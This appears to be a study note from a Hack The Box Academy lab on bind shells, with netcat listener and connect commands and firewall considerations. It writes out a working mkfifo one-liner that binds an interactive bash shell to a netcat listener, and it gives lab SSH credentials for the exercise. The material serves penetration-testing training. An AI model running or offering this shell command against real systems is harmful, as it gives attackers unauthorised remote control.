In a bind shell, you start a listener on the target `nc -nvlp 8000` and you connect to via your attacker machine

![[bind_shell.png]]

#### Things to Consider:

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls will likely block most incoming connections that aren't associated with trusted network-based applications.

**Start Ncat listener on the target**
```
nc -lvnp 7777
```

**Connect to the target from your attacker(client)**
```
nc -nv 10.129.41.200 7777
```


- The above is not a bind shell because we cannot interact with the OS and file system. 
- We are only able to pass text within the pipe setup by Netcat. 
- Now use Netcat to serve up our shell to establish a real bind shell.
#### Binding a bash shell to the TCP session
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

**Now connect the binding shell on your attacker(client)**
```shell-session
nc -nv 10.129.41.200 7777
```

#### Practice

SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.
	**SSH to 10.129.201.134 with user "htb-student" and password "HTB_@cademy_stdnt!"**



